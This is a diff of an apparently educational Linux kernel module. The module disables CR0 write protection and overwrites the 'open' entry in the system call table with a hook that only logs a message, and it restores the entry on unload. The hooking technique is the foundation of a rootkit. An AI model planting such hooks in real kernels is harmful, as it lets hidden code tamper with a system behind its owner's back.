@@ -29,53 +29,77 @@ void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81073110;
 //We're getting its adddress from the System.map file (see above).
 static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00280;
 
-//Function pointer will be used to save address of original 'open' syscall.
-//The asmlinkage keyword is a GCC #define that indicates this function
-//should expect ti find its arguments on the stack (not in registers).
-//This is used for all system calls.
-asmlinkage int (*original_call)(const char *pathname, int flags);
 
-//Define our new sneaky version of the 'open' syscall
-asmlinkage int sneaky_sys_open(const char *pathname, int flags)
+//////////////////////////////
+///   "open" system call
+//////////////////////////////
+
+// function ptr to original systen call "open" (token: __NR_open)
+asmlinkage int (*original_open)(const char *pathname, int flags);
+
+// Define new "open"
+asmlinkage int sneaky_open(const char *pathname, int flags)
 {
-  printk(KERN_INFO "Very, very Sneaky!\n");
-  return original_call(pathname, flags);
+  printk(KERN_INFO "Not So Sneaky!\n");
+
+  // return to the original "open"
+  return original_open(pathname, flags);
 }
 
+
+////////////////////////////////
+///  module load/unload routine
+////////////////////////////////
 
 //The code that gets executed when the module is loaded
 static int initialize_sneaky_module(void)
 {
+  ///////////////////
+  //  preparations
+  ///////////////////
   struct page *page_ptr;
 
   //See /var/log/syslog for kernel print output
   printk(KERN_INFO "Sneaky module being loaded.\n");
 
-  /* //Turn off write protection mode */
+  //Turn off write protection mode
   write_cr0(read_cr0() & (~0x10000));
-  //Get a pointer to the virtual page containing the address
-  //of the system call table in the kernel.
+  
+  // Get ptr to sys_call_table
   page_ptr = (struct page *)virt_to_page(&sys_call_table);
-  /* //Make this page read-write accessible */
+
+  // Make this page read-write accessible
   pages_rw(page_ptr, 1);
 
-  //This is the magic! Save away the original 'open' system call
-  //function address. Then overwrite its address in the system call
-  //table with the function address of our new code.
-  original_call = (void*)*(sys_call_table + __NR_open);
-  *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
+
+  /////////////////////////////
+  // change system call table
+  /////////////////////////////
+
+  // substitute "open" system call (token: __NR_open )
+  original_open = (void*)*(sys_call_table + __NR_open);
+  *(sys_call_table + __NR_open) = (unsigned long)sneaky_open;
+
+
+  ////////////////////
+  ///  clean-ups
+  ////////////////////
 
   //Revert page to read-only
   pages_ro(page_ptr, 1);
   //Turn write protection mode back on
   write_cr0(read_cr0() | 0x10000);
 
-  return 0;       // to show a successful load 
+  return 0; // to show a successful load 
 }  
 
 
 static void exit_sneaky_module(void) 
 {
+  ////////////////////
+  ///  preparations
+  ////////////////////
+  
   struct page *page_ptr;
 
   printk(KERN_INFO "Sneaky module being unloaded.\n"); 
@@ -83,16 +107,24 @@ static void exit_sneaky_module(void)
   //Turn off write protection mode
   write_cr0(read_cr0() & (~0x10000));
 
-  /* //Get a pointer to the virtual page containing the address */
-  /* //of the system call table in the kernel. */
+  // get ptr to system call page
   page_ptr = (struct page *)virt_to_page(&sys_call_table);
   //Make this page read-write accessible
   pages_rw(page_ptr, 1);
+  
 
-  //This is more magic! Restore the original 'open' system call
-  //function address. Will look like malicious code was never there!
-  *(sys_call_table + __NR_open) = (unsigned long)original_call;
+  //////////////////////////////////////////////////////////////////////
+  ///  recover system call table with saved original function pointers
+  //////////////////////////////////////////////////////////////////////
 
+  // recover original "open" system call (token: __NR_open )
+  *(sys_call_table + __NR_open) = (unsigned long)original_open;
+
+
+  /////////////////
+  ///  clean-ups
+  /////////////////
+  
   //Revert page to read-only
   pages_ro(page_ptr, 1);
   //Turn write protection mode back on
